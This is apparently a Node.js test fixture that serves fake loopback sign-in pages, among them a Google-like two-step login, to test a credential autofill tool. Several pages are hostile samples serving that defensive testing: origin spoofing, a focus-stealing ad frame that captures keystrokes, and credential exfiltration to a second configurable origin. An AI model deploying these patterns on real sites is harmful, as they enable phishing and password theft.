// FAKE LOGIN PAGES on loopback (lane vault-login-chrome) — never the real Google: the SHAPES of a one-step form, a
// Google-like two-step sign-in (an identifier view, then a password view behind a script "Next", then a two-step code
// page) and a React-like controlled form (a value tracker: a script's `.value =` is not an edit). Each page reports what
// it RECEIVED to this server (the suite reads `received()`), never to the page's own text.
import http from 'node:http';

const VALUE_TRACKER = `function track(el, onEdit) { // a React-like controlled input: the framework's tracker hears the element's own setter
  const d = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value'); let tracked = el.value;
  Object.defineProperty(el, 'value', { configurable: true, get() { return d.get.call(this); }, set(v) { tracked = String(v); d.set.call(this, v); } });
  el.addEventListener('input', () => { const v = d.get.call(el); if (v === tracked) return; tracked = v; onEdit(v); });
}`;
const page = (title, body, script = '') => `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title>
<style>body{font:16px sans-serif;margin:40px} input{display:block;margin:8px 0;padding:6px;width:280px;font:16px monospace} .btn{display:inline-block;padding:6px 14px;background:#1a73e8;color:#fff;cursor:pointer} [hidden]{display:none!important}</style></head><body>${body}<script>${script}</script></body></html>`;
const post = `function post(path, body) { return fetch(path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }); }`;

const PAGES = {
  '/one': (url) => {
    const act = url && url.searchParams && url.searchParams.get('direct') ? '/done/one-direct' : '/done/one';
    return page('Sign in — one step', `<form id="f" method="post" action="${act}"><label>User <input id="u" name="username" autocomplete="username"></label><label>Password <input id="p" type="password" name="password" autocomplete="current-password" minlength="4"></label><label><input type="checkbox" id="rem" name="remember" value="yes" style="display:inline-block;width:auto"> Remember</label><select id="role" name="role"><option value="user">User</option><option value="admin">Admin</option></select><button type="submit">Sign in</button></form>`);
  },
  '/two': () => page('Sign in – Google-like', `<div id="vid"><h1>Sign in</h1><input type="email" id="identifierId" name="identifier" autocomplete="username" aria-label="Email or phone" spellcheck="false"><div role="button" class="btn" id="idNext" tabindex="0">Next</div><div id="iderr" hidden>Enter an email or phone number</div></div>
<div id="vpw" hidden><h1>Welcome</h1><div id="who"></div><input type="password" name="Passwd" aria-label="Enter your password" autocomplete="current-password"><div role="button" class="btn" id="pwNext" tabindex="0">Next</div><div id="pwerr" hidden>Enter a password</div></div>`,
  `${VALUE_TRACKER}${post}
const st = { identifier: '', password: '' };
const idEl = document.getElementById('identifierId'), pwEl = document.querySelector('input[name=Passwd]');
track(idEl, (v) => { st.identifier = v; }); track(pwEl, (v) => { st.password = v; });
function idNext() { if (!st.identifier) { document.getElementById('iderr').hidden = false; post('/seen/two-id', { empty: true }); return; } post('/seen/two-id', { identifier: st.identifier }); document.getElementById('vid').hidden = true; document.getElementById('who').textContent = st.identifier; document.getElementById('vpw').hidden = false; history.pushState({}, '', '/two/challenge/pwd'); pwEl.focus(); }
function pwNext() { if (!st.password) { document.getElementById('pwerr').hidden = false; post('/seen/two-pw', { empty: true }); return; } post('/done/two', { identifier: st.identifier, Passwd: st.password }).then(() => { location.href = '/totp'; }); }
document.getElementById('idNext').addEventListener('click', idNext); document.getElementById('pwNext').addEventListener('click', pwNext);
idEl.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); idNext(); } });
pwEl.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); pwNext(); } });`),
  '/totp': () => page('2-Step Verification', `<h1>2-Step Verification</h1><input type="tel" id="totpPin" name="totpPin" autocomplete="one-time-code" inputmode="numeric" aria-label="Enter code" maxlength="8"><div role="button" class="btn" id="totpNext" tabindex="0">Next</div>`,
  `${VALUE_TRACKER}${post}
let code = ''; const el = document.getElementById('totpPin'); track(el, (v) => { code = v; });
function next() { post('/done/totp', { code }).then(() => { location.href = '/welcome'; }); }
document.getElementById('totpNext').addEventListener('click', next); el.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); next(); } });`),
  '/react': () => page('Sign in — controlled', `<div><input id="ru" autocomplete="username" placeholder="Username"><input id="rp" type="password" autocomplete="current-password" placeholder="Password"><div role="button" class="btn" id="rgo">Log in</div></div>`,
  `${VALUE_TRACKER}${post}
const st = { u: '', p: '' }; track(document.getElementById('ru'), (v) => { st.u = v; }); track(document.getElementById('rp'), (v) => { st.p = v; });
function go() { post('/done/react', { username: st.u, password: st.p }).then(() => { location.href = '/welcome'; }); }
document.getElementById('rgo').addEventListener('click', go); document.getElementById('rp').addEventListener('keydown', (e) => { if (e.key === 'Enter') go(); });`),
  '/plain': () => page('Nothing to sign in', '<p>No form here.</p><input id="q" placeholder="Search">'),
  '/welcome': () => page('Welcome', '<h1>Signed in</h1>'),
  '/spoof': (url) => {
    const target = url.searchParams.get('target') || 'https://accounts.example.test';
    return page('Sign in — spoof', `<form id="f" method="post" action="/done/spoof"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`,
      `${post}
const OrigString = window.String;
const realOrigin = location.origin;
const FAKE = ${JSON.stringify(target)};
window.String = new Proxy(OrigString, { apply(t, th, a) { const r = Reflect.apply(t, th, a); return r === realOrigin ? FAKE : r; } });
document.getElementById('p').addEventListener('input', (e) => { post('/done/spoof', { username: document.getElementById('u').value, password: e.target.value }); });`);
  },
  '/iframe-host': (url) => {
    const src = url.searchParams.get('src') || 'about:blank';
    return page('Embedded Sign-in', `<h1>Partner Portal</h1><iframe id="phish" src=${JSON.stringify(src)} width="420" height="280"></iframe>`);
  },
  '/clear-trap': () => page('Clear trap', `<form id="f" method="post" action="/done/clear-trap"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`,
    `${post}
document.getElementById('p').addEventListener('input', (e) => { e.target.value = ''; });
document.getElementById('f').addEventListener('submit', (e) => { e.preventDefault(); post('/done/clear-trap', { username: document.getElementById('u').value, password: document.getElementById('p').value }); });`),
  '/focus-trap': (url) => {
    const when = url.searchParams.get('when') === 'input' ? 'input' : 'focus';
    return page('Focus trap', `<form id="f" method="post" action="/done/focus-trap"><input id="trap" type="text" placeholder="Search"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`,
      `${post}
const trap = document.getElementById('trap');
document.getElementById('p').addEventListener(${JSON.stringify(when)}, () => { trap.focus(); });
document.getElementById('f').addEventListener('submit', (e) => { e.preventDefault(); post('/done/focus-trap', { trap: trap.value }); });`);
  },
  '/vanilla': () => page('Sign in — vanilla JS', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`,
    `${post}
document.getElementById('f').addEventListener('submit', (e) => {
  e.preventDefault();
  post('/done/vanilla', { username: document.getElementById('u').value, password: document.getElementById('p').value }).then(() => { location.href = '/welcome'; });
});`),
  '/fd': () => page('Sign in — FormData', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`,
    `${post}
document.getElementById('f').addEventListener('submit', (e) => {
  e.preventDefault();
  const fd = new FormData(e.target);
  post('/done/fd', Object.fromEntries(fd.entries())).then(() => { location.href = '/welcome'; });
});`),
  '/btn-traps': () => page('Sign in — button traps', `<div id="box">
  <button type="button" id="backBtn">Back</button>
  <input id="u" autocomplete="username" placeholder="Username">
  <input id="p" type="password" autocomplete="current-password" placeholder="Password">
  <button type="button" id="showBtn" aria-label="Show password">Show</button>
  <button type="button" id="toggleBtn" aria-pressed="false">Remember</button>
  <button type="button" id="signupLink">Create account</button>
  <div role="button" class="btn" id="realGo" tabindex="0">Sign in</div>
</div>`,
    `${post}
const u = document.getElementById('u'), p = document.getElementById('p');
document.getElementById('backBtn').addEventListener('click', () => post('/trap/back', { clicked: 'back' }));
document.getElementById('showBtn').addEventListener('click', () => { p.type = 'text'; post('/trap/show', { clicked: 'show' }); });
document.getElementById('toggleBtn').addEventListener('click', () => post('/trap/toggle', { clicked: 'toggle' }));
document.getElementById('signupLink').addEventListener('click', () => post('/trap/signup', { clicked: 'signup' }));
document.getElementById('realGo').addEventListener('click', () => {
  post('/done/btn-traps', { username: u.value, password: p.value, pwType: p.type }).then(() => { location.href = '/welcome'; });
});`),
  '/signup-check': (url) => {
    const reqCheck = url.searchParams.get('reqcheck') === '1';
    const emailCheck = url.searchParams.get('emailcheck') === '1';
    const beacon = url.searchParams.get('beacon') === '1';
    return page('Create account', `<form id="f">
  <input id="su" name="email" type="email" autocomplete="email" placeholder="Email">
  <input id="sp1" name="password" type="password" autocomplete="new-password" minlength="12" placeholder="New password">
  <input id="sp2" name="confirm" type="password" autocomplete="new-password" minlength="12" placeholder="Confirm password">
  ${reqCheck ? '<label><input type="checkbox" id="tos" name="tos" required style="display:inline-block;width:auto"> Agree</label>' : ''}
  <button type="submit">Create account</button>
  <a id="termsLink" href="/plain">Terms</a>
  <div id="err" hidden></div>
</form>`,
      `${post}
${emailCheck ? `document.getElementById('su').addEventListener('change', (e) => { post('/seen/email-avail', { email: e.target.value }); });` : ''}
${beacon ? `document.getElementById('sp2').addEventListener('change', () => { try { navigator.sendBeacon('/seen/beacon', 'ping=1'); } catch {} });` : ''}
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const email = document.getElementById('su').value;
  const p1 = document.getElementById('sp1').value;
  const p2 = document.getElementById('sp2').value;
  if (!p1 || p1 !== p2) {
    await post('/done/signup-mismatch', { email, len1: p1.length, len2: p2.length, match: p1 === p2 });
    document.getElementById('err').hidden = false;
    return;
  }
  const r = await fetch('/done/signup-check', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password: p1, match: true }),
  });
  let data = null;
  try { data = await r.json(); } catch { data = null; }
  if (!r.ok || (data && data.ok === false)) {
    document.getElementById('err').hidden = false;
    document.getElementById('err').textContent = 'Taken';
    const sp = new URLSearchParams(location.search);
    if (sp.get('clearerr') === '1') {
      document.getElementById('sp1').value = '';
      document.getElementById('sp2').value = '';
    }
    if (sp.get('jsonerr') === '1') history.pushState({}, '', '/signup-check?err=taken');
    return;
  }
  if (new URLSearchParams(location.search).get('spa') === '1') {
    document.getElementById('f').replaceWith(Object.assign(document.createElement('h1'), { textContent: 'Account created' }));
  } else {
    location.href = '/welcome';
  }
});`);
  },
  '/change-pw': (url) => {
    const mode = url.searchParams.get('jsonerr') === '1' ? 'jsonerr' : 'ok';
    return page('Change password', `<form id="cf">
  <input id="cpOld" name="current" type="password" autocomplete="current-password" placeholder="Current password">
  <input id="cpNew" name="next" type="password" autocomplete="new-password" minlength="12" placeholder="New password">
  <button type="submit">Update password</button>
  <div id="cerr" hidden></div>
</form>`,
      `document.getElementById('cf').addEventListener('submit', async (e) => {
  e.preventDefault();
  const current = document.getElementById('cpOld').value;
  const next = document.getElementById('cpNew').value;
  const r = await fetch('/done/change-pw?mode=' + ${JSON.stringify(mode)}, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ current, next }),
  });
  let data = null;
  try { data = await r.json(); } catch { data = null; }
  if (!r.ok || (data && (data.ok === false || data.error))) {
    document.getElementById('cpOld').value = '';
    document.getElementById('cpNew').value = '';
    document.getElementById('cerr').hidden = false;
    history.pushState({}, '', '/change-pw?err=1');
    return;
  }
  location.href = '/welcome';
});`);
  },
  '/embed-email': () => page('Newsletter Widget', `<form id="nlf"><input id="nl" type="email" autocomplete="email" placeholder="Newsletter email"></form>`),
  '/srcdoc-login': () => page('Framed login', `<h1>Portal</h1><iframe id="sd" srcdoc="<form><input name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'><button type='submit'>Sign in</button></form>" width="420" height="220"></iframe>`),
  '/spa-login': () => page('SPA Sign in', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`,
    `${post}
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('u').value;
  const password = document.getElementById('p').value;
  await post('/done/spa-login', { username, password });
  document.getElementById('f').replaceWith(Object.assign(document.createElement('h1'), { textContent: 'Signed in SPA' }));
  history.pushState({}, '', '/spa-app');
});`),
  '/thief-frame': () => page('Ad Frame', `<input id="thief" type="text" placeholder="Ad search">`,
    `${post}
const t = document.getElementById('thief');
setInterval(() => { try { t.focus(); } catch {} }, 1);
t.addEventListener('input', () => { if (t.value) post('/seen/iframe-thief', { len: t.value.length, val: t.value }); });`),
  '/one-with-thief': (url) => {
    const src = url.searchParams.get('src') || 'about:blank';
    return page('Sign in — with ad frame', `<form id="f" method="post" action="/done/one"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form><iframe id="ad" src=${JSON.stringify(src)} width="300" height="120"></iframe>`);
  },
  '/disable-widgets': () => page('Sign in — disabled & widgets', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><input id="vol" type="range" value="50"><input id="tint" type="color" value="#112233"><button type="button" id="lockBtn">Submitting</button></form>`,
    `document.getElementById('lockBtn').addEventListener('click', () => { document.getElementById('u').disabled = true; document.getElementById('p').disabled = true; });`),
  '/xform': (url) => {
    const act = url.searchParams.get('action') || '/done/one';
    return page('Sign in — cross-origin action', `<form id="f" method="post" action=${JSON.stringify(act)}><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`);
  },
  '/hash-spa': () => page('Sign in — client hashed', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button><div id="st"></div></form>`,
    `${post}
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const u = document.getElementById('u').value;
  const p = document.getElementById('p').value;
  let h = 2166136261;
  for (let i = 0; i < p.length; i++) { h ^= p.charCodeAt(i); h = Math.imul(h, 16777619); }
  await post('/done/hash-spa', { username: u, pwHash: 'fnv1a:' + (h >>> 0).toString(16) + ':' + p.length });
  document.getElementById('st').textContent = 'Hashed sent';
});`),
  '/big-signup': () => page('Create account — large payload', `<form id="f"><input id="su" name="email" type="email" autocomplete="email"><input id="sp1" name="password" type="password" autocomplete="new-password" minlength="12"><button type="submit">Create account</button></form>`,
    `document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const email = document.getElementById('su').value;
  const pw = document.getElementById('sp1').value;
  const pad = 'x'.repeat(1150000);
  await fetch('/done/big-signup', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ pad, email, pwLen: pw.length }) });
  location.href = '/welcome';
});`),
  '/hidden-remount': () => page('Sign in — hidden mirror & remount', `<form id="f"><input id="u" name="username" autocomplete="username"><span id="pwSlot"><input id="p" type="password" name="password" autocomplete="current-password"></span><input id="hm" type="hidden" name="pw_mirror"><button type="button" id="showBtn">Toggle</button></form>`,
    `const p = document.getElementById('p');
const hm = document.getElementById('hm');
p.addEventListener('change', () => { hm.value = p.value; });
document.getElementById('showBtn').addEventListener('click', () => {
  const cur = document.getElementById('p');
  if (!cur) return;
  const v = cur.value;
  hm.value = v;
  const t2 = document.createElement('input');
  t2.id = 't2';
  t2.type = 'text';
  t2.setAttribute('value', v);
  document.getElementById('pwSlot').replaceChildren(t2);
});`),
  '/get-auth': (url) => {
    const mode = url.searchParams.get('mode') || 'bearer';
    return page('Sign in — GET Authorization', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button><div id="st"></div></form>`,
      `const mode = ${JSON.stringify(mode)};
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const u = document.getElementById('u').value;
  const p = document.getElementById('p').value;
  const hdr = mode === 'basic' ? ('Basic ' + btoa(u + ':' + p)) : ('Bearer opaque-tok-' + p.length);
  await fetch('/api/hdr', { method: 'GET', headers: { Authorization: hdr } });
  document.getElementById('st').textContent = 'Sent GET auth';
});`);
  },
  '/signup-big-err': (url) => {
    const analytics = url.searchParams.get('analytics') || '';
    const ok70k = url.searchParams.get('ok') === '1';
    return page('Create account — 70 KB response', `<form id="f"><input id="su" name="email" type="email" autocomplete="email"><input id="sp1" name="password" type="password" autocomplete="new-password" minlength="12"><button type="submit">Create account</button></form>`,
      `const analytics = ${JSON.stringify(analytics)};
const ok70k = ${JSON.stringify(ok70k)};
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const email = document.getElementById('su').value;
  const password = document.getElementById('sp1').value;
  if (analytics) fetch(analytics, { method: 'POST', body: 'evt=signup_click' }).catch(() => {});
  const r = await fetch(ok70k ? '/done/signup-70k-ok' : '/done/signup-70k-err', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  await r.text();
  location.href = '/welcome';
});`);
  },
  '/signup-xcred': (url) => {
    const api = url.searchParams.get('api') || '/done/signup-check';
    const analytics = url.searchParams.get('analytics') || '';
    return page('Create account — cross-origin API', `<form id="f"><input id="su" name="email" type="email" autocomplete="email"><input id="sp1" name="password" type="password" autocomplete="new-password" minlength="12"><button type="submit">Create account</button></form>`,
      `const api = ${JSON.stringify(api)};
const analytics = ${JSON.stringify(analytics)};
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const email = document.getElementById('su').value;
  const password = document.getElementById('sp1').value;
  if (analytics) fetch(analytics, { method: 'POST', body: 'evt=signup_click' }).catch(() => {});
  await fetch(api, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password }) });
});`);
  },
  '/iframe-draft': (url) => {
    const secretInFrame = url.searchParams.get('secretInFrame') === '1';
    const srcdoc = `<!doctype html><meta charset="utf-8"><div id="ed" contenteditable="true"></div><input id="c" type="text" value=""><textarea id="ta"></textarea><input id="fsec" type="hidden" value=""><script>
document.getElementById('ed').textContent = 'Draft paragraph the person wrote';
document.getElementById('c').value = 'my half-written comment';
document.getElementById('ta').value = 'a longer note in a textarea';
</script>`;
    const srcdocAttr = srcdoc.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
    return page('Sign in — with editor iframe', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form><iframe id="draftFrame" srcdoc="${srcdocAttr}"></iframe>`,
      `const secretInFrame = ${JSON.stringify(secretInFrame)};
if (secretInFrame) {
  const p = document.getElementById('p');
  p.addEventListener('change', () => {
    const fr = document.getElementById('draftFrame');
    const fsec = fr && fr.contentDocument && fr.contentDocument.getElementById('fsec');
    if (fsec) { fsec.value = p.value; fsec.setAttribute('value', p.value); }
  });
}`);
  },
  '/big-textareas': (url) => {
    const longHidden = url.searchParams.get('longHidden') === '1';
    return page('Sign in — large textareas', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><textarea id="ta1"></textarea><textarea id="ta2"></textarea><textarea id="ta3"></textarea><textarea id="ta4"></textarea><input id="vs" type="hidden" name="__VIEWSTATE"><input id="hb" type="hidden" name="big_state"><button type="submit">Sign in</button><div id="st"></div></form>`,
      `const longHidden = ${JSON.stringify(longHidden)};
const chunk = (tag) => (tag + '-0123456789abcdef').repeat(1024).slice(0, 16384);
document.getElementById('ta1').value = chunk('A');
document.getElementById('ta2').value = chunk('B');
document.getElementById('ta3').value = chunk('C');
document.getElementById('ta4').value = chunk('D');
document.getElementById('vs').value = 'v'.repeat(20000);
const p = document.getElementById('p');
const hb = document.getElementById('hb');
if (longHidden) {
  p.addEventListener('change', () => {
    const s = 'x'.repeat(20000) + p.value;
    hb.value = s;
    hb.setAttribute('value', s);
  });
}
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const u = document.getElementById('u').value;
  const pw = p.value;
  if (longHidden) {
    const s = 'x'.repeat(20000) + pw;
    hb.value = s;
    hb.setAttribute('value', s);
  }
  p.value = '';
  await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username: u, password: pw }) });
  document.getElementById('st').textContent = 'SPA submitted';
});`);
  },
  '/exfil-f-g': (url) => {
    const mode = url.searchParams.get('mode') || 'big70k';
    const o2 = url.searchParams.get('o2') || '';
    const o3 = url.searchParams.get('o3') || o2;
    return page('Sign in — exfil & unreadable modes', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button><div id="st"></div></form>`,
      `const mode = ${JSON.stringify(mode)};
const o2 = ${JSON.stringify(o2)};
const o3 = ${JSON.stringify(o3)};
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('u').value;
  const password = document.getElementById('p').value;
  if (mode === 'big70k') {
    await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username, password }) });
    await fetch(o2 + '/done/exfil-70k', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ pad: 'z'.repeat(70000), username, password }) });
  } else if (mode === 'flood70') {
    await fetch(o2 + '/done/exfil-small', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ password }) });
    await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username, password }) });
    const ps = [];
    for (let i = 0; i < 70; i++) {
      ps.push(fetch(o3 + '/done/an-' + i, { method: 'POST', body: 'evt=' + i }));
    }
    await Promise.all(ps);
  } else if (mode === 'beacon') {
    navigator.sendBeacon(o2 + '/done/exfil-beacon', JSON.stringify({ username, password }));
    await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username, password }) });
  } else if (mode === 'big1m2_an') {
    await fetch(o2 + '/done/big-xcred', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ pad: 'p'.repeat(1150000), username, password }) });
    await fetch(o3 + '/done/an-after', { method: 'POST', body: 'evt=after_big' });
  } else if (mode === 'widget_auth') {
    await fetch(o2 + '/api/hdr', { method: 'GET', headers: { Authorization: 'Bearer widget-support-token-123' } });
    document.getElementById('st').textContent = 'Client validation blocked submit';
    return;
  }
  document.getElementById('st').textContent = 'Done ' + mode;
});`);
  },
};

export function startLoginPages() {
  const got = [];
  const srv = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://x');
    res.setHeader('access-control-allow-origin', '*');
    res.setHeader('access-control-allow-headers', 'content-type, authorization');
    if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }
    if (url.pathname === '/api/hdr') {
      got.push({ path: '/api/hdr', method: req.method, hasAuth: Boolean(req.headers.authorization), authKind: String(req.headers.authorization || '').split(' ')[0] || '', at: Date.now() });
      res.writeHead(200, { 'content-type': 'application/json' });
      return res.end('{"ok":true}');
    }
    if (req.method === 'POST') {
      let b = ''; req.on('data', (d) => { b += d; if (b.length > 4 * 1024 * 1024) req.destroy(); });
      req.on('end', () => {
        let body = {};
        if (url.pathname === '/done/big-signup' || url.pathname === '/done/big-xcred') {
          try { const j = JSON.parse(b || '{}'); body = { email: j.email || j.username, pwLen: j.pwLen || (j.password ? j.password.length : 0), bytes: Buffer.byteLength(b) }; } catch { body = { bytes: Buffer.byteLength(b) }; }
        } else {
          try { body = /json/.test(String(req.headers['content-type'])) ? JSON.parse(b || '{}') : Object.fromEntries(new URLSearchParams(b)); } catch { body = { raw: b }; }
        }
        got.push({ path: url.pathname, body, at: Date.now() });
        if (url.pathname === '/done/one') { res.writeHead(303, { location: '/welcome' }); return res.end(); }
        if (url.pathname === '/done/one-direct') { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); return res.end(page('Welcome', '<h1>Signed in</h1>')); }
        if (url.pathname === '/done/xform') { res.writeHead(303, { location: url.searchParams.get('back') || '/welcome' }); return res.end(); }
        if (url.pathname === '/done/signup-70k-err') {
          res.writeHead(200, { 'content-type': 'application/json' });
          return res.end(JSON.stringify({ ok: false, error: 'email taken', pad: 'e'.repeat(70000) }));
        }
        if (url.pathname === '/done/signup-70k-ok') {
          res.writeHead(200, { 'content-type': 'application/json' });
          return res.end(JSON.stringify({ ok: true, pad: 'k'.repeat(70000) }));
        }
        if (url.pathname === '/done/signup-check' && body && body.email === 'reject@example.test') {
          res.writeHead(400, { 'content-type': 'application/json' });
          return res.end('{"ok":false,"error":"taken"}');
        }
        if (url.pathname === '/done/signup-check' && body && (body.email === 'jsonerr@example.test' || String(body.email || '').startsWith('jsonerr-'))) {
          res.writeHead(200, { 'content-type': 'application/json' });
          return res.end('{"ok":false,"error":"taken"}');
        }
        if (url.pathname === '/done/change-pw' && url.searchParams.get('mode') === 'jsonerr') {
          res.writeHead(200, { 'content-type': 'application/json' });
          return res.end('{"ok":false,"error":"bad_current"}');
        }
        res.writeHead(200, { 'content-type': 'application/json' }); res.end('{"ok":true}');
      });
      return;
    }
    const p = PAGES[url.pathname.replace(/\/challenge\/pwd$/, '')];
    if (!p) { res.writeHead(404); return res.end('nope'); }
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }); res.end(p(url));
  });
  return new Promise((ok) => srv.listen(0, '127.0.0.1', () => ok({
    origin: `http://127.0.0.1:${srv.address().port}`,
    port: srv.address().port,
    received: () => got.slice(),
    clear: () => { got.length = 0; },
    close: () => new Promise((r) => {
      srv.closeIdleConnections?.();
      srv.closeAllConnections?.();
      srv.close(() => r());
    }),
  })));
}
